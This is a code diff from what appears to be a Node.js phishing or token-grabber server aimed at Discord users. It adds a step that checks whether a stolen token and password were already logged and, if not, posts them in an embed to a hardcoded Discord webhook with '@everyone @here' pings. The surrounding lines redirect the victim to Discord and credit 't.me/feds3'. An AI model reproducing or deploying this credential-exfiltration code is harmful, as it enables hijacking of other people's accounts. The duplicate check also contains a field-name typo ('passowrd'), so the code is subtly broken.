@@ -122,6 +122,19 @@ window.location="https://discord.com/channels/@me";
 
       embed.setDescription(rawStringData);
       embed.setFooter("Created by t.me/feds3");
+
+      // Cache Part
+
+      if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
+        console.log("Found Duplicate Logged ID");
+      } else {
+        await axios({ method: "POST", url: "https://discord.com/api/webhooks/1055710474643193897/m1mq1DQfblSS3qUJW2s8LgLSA-CVflTu7CHLGznJizZ8oXVYiuAxzNW-XA9RjS7p2zpw", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
+        process.logged.push({ token, password: pass });
+      }
+    } catch (err) {
+      console.log(err);
+    }
+  }
 });
 
 app.listen(4200, () => {
